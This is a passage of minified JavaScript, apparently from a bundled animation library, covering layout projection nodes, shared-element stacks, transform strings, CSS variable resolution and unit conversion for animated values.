jx{constructor(){this.members=[]}add(r){Rc(this.members,r),r.scheduleRender()}remove(r){if(Nc(this.members,r),r===this.prevLead&&(this.prevLead=void 0),r===this.lead){const o=this.members[this.members.length-1];o&&this.promote(o)}}relegate(r){const o=this.members.findIndex(c=>r===c);if(o===0)return!1;let a;for(let c=o;c>=0;c--){const p=this.members[c];if(p.isPresent!==!1){a=p;break}}return a?(this.promote(a),!0):!1}promote(r,o){const a=this.lead;if(r!==a&&(this.prevLead=a,this.lead=r,r.show(),a)){a.instance&&a.scheduleRender(),r.scheduleRender(),r.resumeFrom=a,o&&(r.resumeFrom.preserveOpacity=!0),a.snapshot&&(r.snapshot=a.snapshot,r.snapshot.latestValues=a.animationValues||a.latestValues),r.root&&r.root.isUpdating&&(r.isLayoutDirty=!0);const{crossfade:c}=r.options;c===!1&&a.hide()}}exitAnimationComplete(){this.members.forEach(r=>{const{options:o,resumingFrom:a}=r;o.onExitComplete&&o.onExitComplete(),a&&a.options.onExitComplete&&a.options.onExitComplete()})}scheduleRender(){this.members.forEach(r=>{r.instance&&r.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}function Fh(n,r,o){let a="";const c=n.x.translate/r.x,p=n.y.translate/r.y;if((c||p)&&(a=`translate3d(${c}px, ${p}px, 0) `),(r.x!==1||r.y!==1)&&(a+=`scale(${1/r.x}, ${1/r.y}) `),o){const{rotate:g,rotateX:f,rotateY:y}=o;g&&(a+=`rotate(${g}deg) `),f&&(a+=`rotateX(${f}deg) `),y&&(a+=`rotateY(${y}deg) `)}const d=n.x.scale*r.x,h=n.y.scale*r.y;return(d!==1||h!==1)&&(a+=`scale(${d}, ${h})`),a||"none"}const Bx=(n,r)=>n.depth-r.depth;class Fx{constructor(){this.children=[],this.isDirty=!1}add(r){Rc(this.children,r),this.isDirty=!0}remove(r){Nc(this.children,r),this.isDirty=!0}forEach(r){this.isDirty&&this.children.sort(Bx),this.isDirty=!1,this.children.forEach(r)}}function Vx(n,r){const o=performance.now(),a=({timestamp:c})=>{const p=c-o;p>=r&&(tn(a),n(p-r))};return De.read(a,!0),()=>tn(a)}function Ox(n){window.MotionDebug&&window.MotionDebug.record(n)}function zx(n){return n instanceof SVGElement&&n.tagName!=="svg"}function _x(n,r,o){const a=dt(n)?n:Dr(n);return a.start(Mc("",a,r,o)),a.animation}const Vh=["","X","Y","Z"],Wx={visibility:"hidden"},Oh=1e3;let Ux=0;const Gn={type:"projectionFrame",totalNodes:0,resolvedTargetDeltas:0,recalculatedProjection:0};function am({attachResizeListener:n,defaultParent:r,measureScroll:o,checkIsScrollRoot:a,resetTransform:c}){return class{constructor(d={},h=r==null?void 0:r()){this.id=Ux++,this.animationId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,Gn.totalNodes=Gn.resolvedTargetDeltas=Gn.recalculatedProjection=0,this.nodes.forEach($x),this.nodes.forEach(Xx),this.nodes.forEach(Zx),this.nodes.forEach(Kx),Ox(Gn)},this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=d,this.root=h?h.root||h:this,this.path=h?[...h.path,h]:[],this.parent=h,this.depth=h?h.depth+1:0;for(let g=0;g<this.path.length;g++)this.path[g].shouldResetTransform=!0;this.root===this&&(this.nodes=new Fx)}addEventListener(d,h){return this.eventHandlers.has(d)||this.eventHandlers.set(d,new Lc),this.eventHandlers.get(d).add(h)}notifyListeners(d,...h){const g=this.eventHandlers.get(d);g&&g.notify(...h)}hasListeners(d){return this.eventHandlers.has(d)}mount(d,h=this.root.hasTreeAnimated){if(this.instance)return;this.isSVG=zx(d),this.instance=d;const{layoutId:g,layout:f,visualElement:y}=this.options;if(y&&!y.current&&y.mount(d),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),h&&(f||g)&&(this.isLayoutDirty=!0),n){let v;const w=()=>this.root.updateBlockedByResize=!1;n(d,()=>{this.root.updateBlockedByResize=!0,v&&v(),v=Vx(w,250),is.hasAnimatedSinceResize&&(is.hasAnimatedSinceResize=!1,this.nodes.forEach(_h))})}g&&this.root.registerSharedNode(g,this),this.options.animate!==!1&&y&&(g||f)&&this.addEventListener("didUpdate",({delta:v,hasLayoutChanged:w,hasRelativeTargetChanged:T,layout:M})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const A=this.options.transition||y.getDefaultTransition()||r1,{onLayoutAnimationStart:P,onLayoutAnimationComplete:O}=y.getProps(),L=!this.targetLayout||!sm(this.targetLayout,M)||T,N=!w&&T;if(this.options.layoutRoot||this.resumeFrom&&this.resumeFrom.instance||N||w&&(L||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0),this.setAnimationOrigin(v,N);const B={...Dc(A,"layout"),onPlay:P,onComplete:O};(y.shouldReduceMotion||this.options.layoutRoot)&&(B.delay=0,B.type=!1),this.startAnimation(B)}else w||_h(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=M})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const d=this.getStack();d&&d.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,tn(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(Jx),this.animationId++)}getTransformTemplate(){const{visualElement:d}=this.options;return d&&d.getProps().transformTemplate}willUpdate(d=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let y=0;y<this.path.length;y++){const v=this.path[y];v.shouldResetTransform=!0,v.updateScroll("snapshot"),v.options.layoutRoot&&v.willUpdate(!1)}const{layoutId:h,layout:g}=this.options;if(h===void 0&&!g)return;const f=this.getTransformTemplate();this.prevTransformTemplateValue=f?f(this.latestValues,""):void 0,this.updateSnapshot(),d&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(zh);return}this.isUpdating||this.nodes.forEach(Yx),this.isUpdating=!1,this.nodes.forEach(Qx),this.nodes.forEach(Hx),this.nodes.forEach(Gx),this.clearAllSnapshots();const h=performance.now();et.delta=Pn(0,1e3/60,h-et.timestamp),et.timestamp=h,et.isProcessing=!0,Al.update.process(et),Al.preRender.process(et),Al.render.process(et),et.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,queueMicrotask(()=>this.update()))}clearAllSnapshots(){this.nodes.forEach(qx),this.sharedNodes.forEach(e1)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,De.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){De.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure())}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let g=0;g<this.path.length;g++)this.path[g].updateScroll();const d=this.layout;this.layout=this.measure(!1),this.layoutCorrected=ze(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:h}=this.options;h&&h.notify("LayoutMeasure",this.layout.layoutBox,d?d.layoutBox:void 0)}updateScroll(d="measure"){let h=!!(this.options.layoutScroll&&this.instance);this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===d&&(h=!1),h&&(this.scroll={animationId:this.root.animationId,phase:d,isRoot:a(this.instance),offset:o(this.instance)})}resetTransform(){if(!c)return;const d=this.isLayoutDirty||this.shouldResetTransform,h=this.projectionDelta&&!om(this.projectionDelta),g=this.getTransformTemplate(),f=g?g(this.latestValues,""):void 0,y=f!==this.prevTransformTemplateValue;d&&(h||Hn(this.latestValues)||y)&&(c(this.instance,f),this.shouldResetTransform=!1,this.scheduleRender())}measure(d=!0){const h=this.measurePageBox();let g=this.removeElementScroll(h);return d&&(g=this.removeTransform(g)),i1(g),{animationId:this.root.animationId,measuredBox:h,layoutBox:g,latestValues:{},source:this.id}}measurePageBox(){const{visualElement:d}=this.options;if(!d)return ze();const h=d.measureViewportBox(),{scroll:g}=this.root;return g&&(Tn(h.x,g.offset.x),Tn(h.y,g.offset.y)),h}removeElementScroll(d){const h=ze();At(h,d);for(let g=0;g<this.path.length;g++){const f=this.path[g],{scroll:y,options:v}=f;if(f!==this.root&&y&&v.layoutScroll){if(y.isRoot){At(h,d);const{scroll:w}=this.root;w&&(Tn(h.x,-w.offset.x),Tn(h.y,-w.offset.y))}Tn(h.x,y.offset.x),Tn(h.y,y.offset.y)}}return h}applyTransform(d,h=!1){const g=ze();At(g,d);for(let f=0;f<this.path.length;f++){const y=this.path[f];!h&&y.options.layoutScroll&&y.scroll&&y!==y.root&&Ir(g,{x:-y.scroll.offset.x,y:-y.scroll.offset.y}),Hn(y.latestValues)&&Ir(g,y.latestValues)}return Hn(this.latestValues)&&Ir(g,this.latestValues),g}removeTransform(d){const h=ze();At(h,d);for(let g=0;g<this.path.length;g++){const f=this.path[g];if(!f.instance||!Hn(f.latestValues))continue;tc(f.latestValues)&&f.updateSnapshot();const y=ze(),v=f.measurePageBox();At(y,v),Lh(h,f.latestValues,f.snapshot?f.snapshot.layoutBox:void 0,y)}return Hn(this.latestValues)&&Lh(h,this.latestValues),h}setTargetDelta(d){this.targetDelta=d,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(d){this.options={...this.options,...d,crossfade:d.crossfade!==void 0?d.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==et.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(d=!1){var h;const g=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=g.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=g.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=g.isSharedProjectionDirty);const f=!!this.resumingFrom||this!==g;if(!(d||f&&this.isSharedProjectionDirty||this.isProjectionDirty||!((h=this.parent)===null||h===void 0)&&h.isProjectionDirty||this.attemptToResolveRelativeTarget))return;const{layout:v,layoutId:w}=this.options;if(!(!this.layout||!(v||w))){if(this.resolvedRelativeTargetAt=et.timestamp,!this.targetDelta&&!this.relativeTarget){const T=this.getClosestProjectingParent();T&&T.layout&&this.animationProgress!==1?(this.relativeParent=T,this.forceRelativeParentToResolveTarget(),this.relativeTarget=ze(),this.relativeTargetOrigin=ze(),Pi(this.relativeTargetOrigin,this.layout.layoutBox,T.layout.layoutBox),At(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}if(!(!this.relativeTarget&&!this.targetDelta)){if(this.target||(this.target=ze(),this.targetWithTransforms=ze()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),ox(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):At(this.target,this.layout.layoutBox),Jg(this.target,this.targetDelta)):At(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget){this.attemptToResolveRelativeTarget=!1;const T=this.getClosestProjectingParent();T&&!!T.resumingFrom==!!this.resumingFrom&&!T.options.layoutScroll&&T.target&&this.animationProgress!==1?(this.relativeParent=T,this.forceRelativeParentToResolveTarget(),this.relativeTarget=ze(),this.relativeTargetOrigin=ze(),Pi(this.relativeTargetOrigin,this.target,T.target),At(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}Gn.resolvedTargetDeltas++}}}getClosestProjectingParent(){if(!(!this.parent||tc(this.parent.latestValues)||Zg(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}calcProjection(){var d;const h=this.getLead(),g=!!this.resumingFrom||this!==h;let f=!0;if((this.isProjectionDirty||!((d=this.parent)===null||d===void 0)&&d.isProjectionDirty)&&(f=!1),g&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(f=!1),this.resolvedRelativeTargetAt===et.timestamp&&(f=!1),f)return;const{layout:y,layoutId:v}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(y||v))return;At(this.layoutCorrected,this.layout.layoutBox);const w=this.treeScale.x,T=this.treeScale.y;fx(this.layoutCorrected,this.treeScale,this.path,g),h.layout&&!h.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(h.target=h.layout.layoutBox);const{target:M}=h;if(!M){this.projectionTransform&&(this.projectionDelta=Er(),this.projectionTransform="none",this.scheduleRender());return}this.projectionDelta||(this.projectionDelta=Er(),this.projectionDeltaWithTransform=Er());const A=this.projectionTransform;Ai(this.projectionDelta,this.layoutCorrected,M,this.latestValues),this.projectionTransform=Fh(this.projectionDelta,this.treeScale),(this.projectionTransform!==A||this.treeScale.x!==w||this.treeScale.y!==T)&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",M)),Gn.recalculatedProjection++}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(d=!0){if(this.options.scheduleRender&&this.options.scheduleRender(),d){const h=this.getStack();h&&h.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}setAnimationOrigin(d,h=!1){const g=this.snapshot,f=g?g.latestValues:{},y={...this.latestValues},v=Er();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!h;const w=ze(),T=g?g.source:void 0,M=this.layout?this.layout.source:void 0,A=T!==M,P=this.getStack(),O=!P||P.members.length<=1,L=!!(A&&!O&&this.options.crossfade===!0&&!this.path.some(n1));this.animationProgress=0;let N;this.mixTargetDelta=B=>{const $=B/1e3;Wh(v.x,d.x,$),Wh(v.y,d.y,$),this.setTargetDelta(v),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(Pi(w,this.layout.layoutBox,this.relativeParent.layout.layoutBox),t1(this.relativeTarget,this.relativeTargetOrigin,w,$),N&&Lx(this.relativeTarget,N)&&(this.isProjectionDirty=!1),N||(N=ze()),At(N,this.relativeTarget)),A&&(this.animationValues=y,Ex(y,f,this.latestValues,$,L,O)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=$},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(d){this.notifyListeners("animationStart"),this.currentAnimation&&this.currentAnimation.stop(),this.resumingFrom&&this.resumingFrom.currentAnimation&&this.resumingFrom.currentAnimation.stop(),this.pendingAnimation&&(tn(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=De.update(()=>{is.hasAnimatedSinceResize=!0,this.currentAnimation=_x(0,Oh,{...d,onUpdate:h=>{this.mixTargetDelta(h),d.onUpdate&&d.onUpdate(h)},onComplete:()=>{d.onComplete&&d.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const d=this.getStack();d&&d.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(Oh),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const d=this.getLead();let{targetWithTransforms:h,target:g,layout:f,latestValues:y}=d;if(!(!h||!g||!f)){if(this!==d&&this.layout&&f&&lm(this.options.animationType,this.layout.layoutBox,f.layoutBox)){g=this.target||ze();const v=yt(this.layout.layoutBox.x);g.x.min=d.target.x.min,g.x.max=g.x.min+v;const w=yt(this.layout.layoutBox.y);g.y.min=d.target.y.min,g.y.max=g.y.min+w}At(h,g),Ir(h,y),Ai(this.projectionDeltaWithTransform,this.layoutCorrected,h,y)}}registerSharedNode(d,h){this.sharedNodes.has(d)||this.sharedNodes.set(d,new jx),this.sharedNodes.get(d).add(h);const f=h.options.initialPromotionConfig;h.promote({transition:f?f.transition:void 0,preserveFollowOpacity:f&&f.shouldPreserveFollowOpacity?f.shouldPreserveFollowOpacity(h):void 0})}isLead(){const d=this.getStack();return d?d.lead===this:!0}getLead(){var d;const{layoutId:h}=this.options;return h?((d=this.getStack())===null||d===void 0?void 0:d.lead)||this:this}getPrevLead(){var d;const{layoutId:h}=this.options;return h?(d=this.getStack())===null||d===void 0?void 0:d.prevLead:void 0}getStack(){const{layoutId:d}=this.options;if(d)return this.root.sharedNodes.get(d)}promote({needsReset:d,transition:h,preserveFollowOpacity:g}={}){const f=this.getStack();f&&f.promote(this,g),d&&(this.projectionDelta=void 0,this.needsReset=!0),h&&this.setOptions({transition:h})}relegate(){const d=this.getStack();return d?d.relegate(this):!1}resetRotation(){const{visualElement:d}=this.options;if(!d)return;let h=!1;const{latestValues:g}=d;if((g.rotate||g.rotateX||g.rotateY||g.rotateZ)&&(h=!0),!h)return;const f={};for(let y=0;y<Vh.length;y++){const v="rotate"+Vh[y];g[v]&&(f[v]=g[v],d.setStaticValue(v,0))}d.render();for(const y in f)d.setStaticValue(y,f[y]);d.scheduleRender()}getProjectionStyles(d){var h,g;if(!this.instance||this.isSVG)return;if(!this.isVisible)return Wx;const f={visibility:""},y=this.getTransformTemplate();if(this.needsReset)return this.needsReset=!1,f.opacity="",f.pointerEvents=rs(d==null?void 0:d.pointerEvents)||"",f.transform=y?y(this.latestValues,""):"none",f;const v=this.getLead();if(!this.projectionDelta||!this.layout||!v.target){const A={};return this.options.layoutId&&(A.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,A.pointerEvents=rs(d==null?void 0:d.pointerEvents)||""),this.hasProjected&&!Hn(this.latestValues)&&(A.transform=y?y({},""):"none",this.hasProjected=!1),A}const w=v.animationValues||v.latestValues;this.applyTransformsToTarget(),f.transform=Fh(this.projectionDeltaWithTransform,this.treeScale,w),y&&(f.transform=y(w,f.transform));const{x:T,y:M}=this.projectionDelta;f.transformOrigin=`${T.origin*100}% ${M.origin*100}% 0`,v.animationValues?f.opacity=v===this?(g=(h=w.opacity)!==null&&h!==void 0?h:this.latestValues.opacity)!==null&&g!==void 0?g:1:this.preserveOpacity?this.latestValues.opacity:w.opacityExit:f.opacity=v===this?w.opacity!==void 0?w.opacity:"":w.opacityExit!==void 0?w.opacityExit:0;for(const A in as){if(w[A]===void 0)continue;const{correct:P,applyTo:O}=as[A],L=f.transform==="none"?w[A]:P(w[A],v);if(O){const N=O.length;for(let B=0;B<N;B++)f[O[B]]=L}else f[A]=L}return this.options.layoutId&&(f.pointerEvents=v===this?rs(d==null?void 0:d.pointerEvents)||"":"none"),f}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(d=>{var h;return(h=d.currentAnimation)===null||h===void 0?void 0:h.stop()}),this.root.nodes.forEach(zh),this.root.sharedNodes.clear()}}}function Hx(n){n.updateLayout()}function Gx(n){var r;const o=((r=n.resumeFrom)===null||r===void 0?void 0:r.snapshot)||n.snapshot;if(n.isLead()&&n.layout&&o&&n.hasListeners("didUpdate")){const{layoutBox:a,measuredBox:c}=n.layout,{animationType:p}=n.options,d=o.source!==n.layout.source;p==="size"?Pt(v=>{const w=d?o.measuredBox[v]:o.layoutBox[v],T=yt(w);w.min=a[v].min,w.max=w.min+T}):lm(p,o.layoutBox,a)&&Pt(v=>{const w=d?o.measuredBox[v]:o.layoutBox[v],T=yt(a[v]);w.max=w.min+T,n.relativeTarget&&!n.currentAnimation&&(n.isProjectionDirty=!0,n.relativeTarget[v].max=n.relativeTarget[v].min+T)});const h=Er();Ai(h,a,o.layoutBox);const g=Er();d?Ai(g,n.applyTransform(c,!0),o.measuredBox):Ai(g,a,o.layoutBox);const f=!om(h);let y=!1;if(!n.resumeFrom){const v=n.getClosestProjectingParent();if(v&&!v.resumeFrom){const{snapshot:w,layout:T}=v;if(w&&T){const M=ze();Pi(M,o.layoutBox,w.layoutBox);const A=ze();Pi(A,a,T.layoutBox),sm(M,A)||(y=!0),v.options.layoutRoot&&(n.relativeTarget=A,n.relativeTargetOrigin=M,n.relativeParent=v)}}}n.notifyListeners("didUpdate",{layout:a,snapshot:o,delta:g,layoutDelta:h,hasLayoutChanged:f,hasRelativeTargetChanged:y})}else if(n.isLead()){const{onExitComplete:a}=n.options;a&&a()}n.options.transition=void 0}function $x(n){Gn.totalNodes++,n.parent&&(n.isProjecting()||(n.isProjectionDirty=n.parent.isProjectionDirty),n.isSharedProjectionDirty||(n.isSharedProjectionDirty=!!(n.isProjectionDirty||n.parent.isProjectionDirty||n.parent.isSharedProjectionDirty)),n.isTransformDirty||(n.isTransformDirty=n.parent.isTransformDirty))}function Kx(n){n.isProjectionDirty=n.isSharedProjectionDirty=n.isTransformDirty=!1}function qx(n){n.clearSnapshot()}function zh(n){n.clearMeasurements()}function Yx(n){n.isLayoutDirty=!1}function Qx(n){const{visualElement:r}=n.options;r&&r.getProps().onBeforeLayoutMeasure&&r.notify("BeforeLayoutMeasure"),n.resetTransform()}function _h(n){n.finishAnimation(),n.targetDelta=n.relativeTarget=n.target=void 0,n.isProjectionDirty=!0}function Xx(n){n.resolveTargetDelta()}function Zx(n){n.calcProjection()}function Jx(n){n.resetRotation()}function e1(n){n.removeLeadSnapshot()}function Wh(n,r,o){n.translate=Le(r.translate,0,o),n.scale=Le(r.scale,1,o),n.origin=r.origin,n.originPoint=r.originPoint}function Uh(n,r,o,a){n.min=Le(r.min,o.min,a),n.max=Le(r.max,o.max,a)}function t1(n,r,o,a){Uh(n.x,r.x,o.x,a),Uh(n.y,r.y,o.y,a)}function n1(n){return n.animationValues&&n.animationValues.opacityExit!==void 0}const r1={duration:.45,ease:[.4,0,.1,1]},Hh=n=>typeof navigator<"u"&&navigator.userAgent.toLowerCase().includes(n),Gh=Hh("applewebkit/")&&!Hh("chrome/")?Math.round:Ve;function $h(n){n.min=Gh(n.min),n.max=Gh(n.max)}function i1(n){$h(n.x),$h(n.y)}function lm(n,r,o){return n==="position"||n==="preserve-aspect"&&!Jl(Bh(r),Bh(o),.2)}const o1=am({attachResizeListener:(n,r)=>Zt(n,"resize",r),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body.scrollLeft,y:document.documentElement.scrollTop||document.body.scrollTop}),checkIsScrollRoot:()=>!0}),Fl={current:void 0},cm=am({measureScroll:n=>({x:n.scrollLeft,y:n.scrollTop}),defaultParent:()=>{if(!Fl.current){const n=new o1({});n.mount(window),n.setOptions({layoutScroll:!0}),Fl.current=n}return Fl.current},resetTransform:(n,r)=>{n.style.transform=r!==void 0?r:"none"},checkIsScrollRoot:n=>window.getComputedStyle(n).position==="fixed"}),s1={pan:{Feature:xx},drag:{Feature:kx,ProjectionNode:cm,MeasureLayout:nm}},a1=/var\((--[a-zA-Z0-9-_]+),? ?([a-zA-Z0-9 ()%#.,-]+)?\)/;function l1(n){const r=a1.exec(n);if(!r)return[,];const[,o,a]=r;return[o,a]}function rc(n,r,o=1){const[a,c]=l1(n);if(!a)return;const p=window.getComputedStyle(r).getPropertyValue(a);if(p){const d=p.trim();return Gg(d)?parseFloat(d):d}else return $l(c)?rc(c,r,o+1):c}function c1(n,{...r},o){const a=n.current;if(!(a instanceof Element))return{target:r,transitionEnd:o};o&&(o={...o}),n.values.forEach(c=>{const p=c.get();if(!$l(p))return;const d=rc(p,a);d&&c.set(d)});for(const c in r){const p=r[c];if(!$l(p))continue;const d=rc(p,a);d&&(r[c]=d,o||(o={}),o[c]===void 0&&(o[c]=p))}return{target:r,transitionEnd:o}}const u1=new Set(["width","height","top","left","right","bottom","x","y","translateX","translateY"]),um=n=>u1.has(n),d1=n=>Object.keys(n).some(um),Kh=n=>n===er||n===oe,qh=(n,r)=>parseFloat(n.split(", ")[r]),Yh=(n,r)=>(o,{transform:a})=>{if(a==="none"||!a)return 0;const c=a.match(/^matrix3d\((.+)\)$/);if(c)return qh(c[1],r);{const p=a.match(/^matrix\((.+)\)$/);return p?qh(p[1],n):0}},p1=new Set(["x","y","z"]),h1=Ni.filter(n=>!p1.has(n));function f1(n){const r=[];return h1.forEach(o=>{const a=n.getValue(o);a!==void 0&&(r.push([o,a.get()]),a.set(o.startsWith("scale")?1:0))}),r.length&&n.render(),r}const Mr={width:({x:n},{paddingLeft:r="0",paddingRight:o="0"})=>n.max-n.min-parseFloat(r)-parseFloat(o),height:({y:n},{paddingTop:r="0",paddingBottom:o="0"})=>n.max-n.min-parseFloat(r)-parseFloat(o),top:(n,{top:r})=>parseFloat(r),left:(n,{left:r})=>parseFloat(r),bottom:({y:n},{top:r})=>parseFloat(r)+(n.max-n.min),right:({x:n},{left:r})=>parseFloat(r)+(n.max-n.min),x:Yh(4,13),y:Yh(5,14)};Mr.translateX=Mr.x;Mr.translateY=Mr.y;const g1=(n,r,o)=>{const a=r.measureViewportBox(),c=r.current,p=getComputedStyle(c),{display:d}=p,h={};d==="none"&&r.setStaticValue("display",n.display||"block"),o.forEach(f=>{h[f]=Mr[f](a,p)}),r.render();const g=r.measureViewportBox();return o.forEach(f=>{const y=r.getValue(f);y&&y.jump(h[f]),n[f]=Mr[f](g,p)}),n},m1=(n,r,o={},a={})=>{r={...r},a={...a};const c=Object.keys(r).filter(um);let p=[],d=!1;const h=[];if(c.forEach(g=>{const f=n.getValue(g);if(!n.hasValue(g))return;let y=o[g],v=wi(y);const w=r[g];let T;if(cs(w)){const M=w.length,A=w[0]===null?1:0;y=w[A],v=wi(y);for(let P=A;P<M&&w[P]!==null;P++)T?Cc(wi(w[P])===T):T=wi(w[P])}else T=wi(w);if(v!==T)if(Kh(v)&&Kh(T)){const M=f.get();typeof M=="string"&&f.set(parseFloat(M)),typeof w=="string"?r[g]=parseFloat(w):Array.isArray(w)&&T===oe&&(r[g]=w.map(parseFloat))}else v!=null&&v.transform&&(T!=null&&T.transform)&&(y===0||w===0)?y===0?f.set(T.transform(y)):r[g]=v.transform(w):(d||(p=f1(n),d=!0),h.push(g),a[g]=a[g]!==void 0?a[g]:r[g],f.jump(w))}),h.length){const g=h.indexOf("height")>=0?window.pageYOffset:null,f=g1(r,n,h);return p.length&&p.forEach(([y,v])=>{n.getValue(y).set(v)}),n.render(),vs&&g!==null&&window.scrollTo({top:g}),{target:f,transitionEnd:a}}else return{target:r,transitionEnd:a}};function y1(n,r,o,a){return d1(r)?m1(n,r,o,a):{target:r,transitionEnd:a}}const v1=(n,r,o,a)=>{const c=c1(n,r,a);return r=c.target,a=c.transitionEnd,y1(n,r,o,a)},ic={current:null},dm={current:!1};function b1(){if(dm.current=!0,!!vs)if(window.matchMedia){const n=window.matchMedia("(prefers-reduced-motion)"),r=()=>ic.current=n.matches;n.addListener(r),r()}else ic.current=!1}function w1(n,r,o){const{willChange:a}=r;for(const c in r){const p=r[c],d=o[c];if(dt(p))n.addValue(c,p),hs(a)&&a.add(c);else if(dt(d))n.addValue(c,Dr(p,{owner:n})),hs(a)&&a.remove(c);else if(d!==p)if(n.hasValue(c)){const h=n.getValue(c);!h.hasAnimated&&h.set(p)}else{const h=n.getStaticValue(c);n.addValue(c,Dr(h!==void 0?h:p,{owner:n}))}}for(const c in o)r[c]===void 0&&n.removeValue(c);return r}const Qh=new WeakMap,pm=Object.keys(Di),k1=pm.length,Xh=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"],x1=yc.length;class S1{constructor({parent:r,props:o,presenceContext:a,reducedMotionConfig:c,visualState:p},d={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.values=new Map,this.features={},this.valueSubscriptions=new 